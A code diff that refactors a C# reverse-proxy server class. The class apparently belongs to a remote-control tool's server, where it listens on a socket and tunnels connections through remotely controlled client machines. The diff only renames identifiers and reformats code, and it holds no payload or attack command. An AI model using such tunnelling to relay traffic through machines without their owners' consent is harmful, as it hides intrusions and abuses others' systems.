@@ -2,19 +2,19 @@
 using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 
 namespace xServer.Core.ReverseProxy
 {
     public class ReverseProxyServer
     {
-        public delegate void ConnectionEstablishedCallback(ReverseProxyClient ProxyClient);
-        public delegate void UpdateConnectionCallback(ReverseProxyClient ProxyClient);
+        public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);
 
-        public event ConnectionEstablishedCallback onConnectionEstablished;
-        public event UpdateConnectionCallback onUpdateConnection;
+        public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
 
-        private Socket socket;
+        public event ConnectionEstablishedCallback OnConnectionEstablished;
+        public event UpdateConnectionCallback OnUpdateConnection;
+
+        private Socket _socket;
         private List<ReverseProxyClient> _clients;
 
         public ReverseProxyClient[] Clients
@@ -35,17 +35,17 @@ namespace xServer.Core.ReverseProxy
             _clients = new List<ReverseProxyClient>();
         }
 
-        public void StartServer(Client client, string IpAddress, int Port)
+        public void StartServer(Client client, string ipAddress, int port)
         {
             Stop();
 
             this.Client = client;
             this.Client.Value.ProxyServer = this;
 
-            this.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            this.socket.Bind(new IPEndPoint(IPAddress.Parse(IpAddress), Port));
-            this.socket.Listen(100);
-            this.socket.BeginAccept(socket_BeginAccept, null);
+            this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            this._socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), port));
+            this._socket.Listen(100);
+            this._socket.BeginAccept(socket_BeginAccept, null);
         }
 
         private void socket_BeginAccept(IAsyncResult ar)
@@ -54,22 +54,27 @@ namespace xServer.Core.ReverseProxy
             {
                 lock (_clients)
                 {
-                    _clients.Add(new ReverseProxyClient(Client, this.socket.EndAccept(ar), this));
+                    _clients.Add(new ReverseProxyClient(Client, this._socket.EndAccept(ar), this));
                 }
             }
-            catch { }
+            catch
+            {
+            }
 
             try
             {
-                this.socket.BeginAccept(socket_BeginAccept, null);
+                this._socket.BeginAccept(socket_BeginAccept, null);
             }
-            catch { /* Server stopped listening */ }
+            catch
+            {
+                /* Server stopped listening */
+            }
         }
 
         public void Stop()
         {
-            if (socket != null)
-                socket.Close();
+            if (_socket != null)
+                _socket.Close();
 
             lock (_clients)
             {
@@ -79,40 +84,43 @@ namespace xServer.Core.ReverseProxy
             }
         }
 
-        public ReverseProxyClient GetClientByConnectionId(int ConnectionId)
+        public ReverseProxyClient GetClientByConnectionId(int connectionId)
         {
             lock (_clients)
             {
                 for (int i = 0; i < _clients.Count; i++)
                 {
-                    if (_clients[i].ConnectionId == ConnectionId)
+                    if (_clients[i].ConnectionId == connectionId)
                         return _clients[i];
                 }
                 return null;
             }
         }
 
-        internal void CallonConnectionEstablished(ReverseProxyClient ProxyClient)
+        internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
         {
             try
             {
-                if (onConnectionEstablished != null)
-                    onConnectionEstablished(ProxyClient);
+                if (OnConnectionEstablished != null)
+                    OnConnectionEstablished(proxyClient);
             }
-            catch { }
+            catch
+            {
+            }
         }
-        internal void CallonUpdateConnection(ReverseProxyClient ProxyClient)
+
+        internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
         {
             //remove a client that has been disconnected
             try
             {
-                if (!ProxyClient.IsConnected)
+                if (!proxyClient.IsConnected)
                 {
                     lock (_clients)
                     {
                         for (int i = 0; i < _clients.Count; i++)
                         {
-                            if (_clients[i].ConnectionId == ProxyClient.ConnectionId)
+                            if (_clients[i].ConnectionId == proxyClient.ConnectionId)
                             {
                                 _clients.RemoveAt(i);
                                 break;
@@ -121,14 +129,18 @@ namespace xServer.Core.ReverseProxy
                     }
                 }
             }
-            catch { }
+            catch
+            {
+            }
 
             try
             {
-                if (onUpdateConnection != null)
-                    onUpdateConnection(ProxyClient);
+                if (OnUpdateConnection != null)
+                    OnUpdateConnection(proxyClient);
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
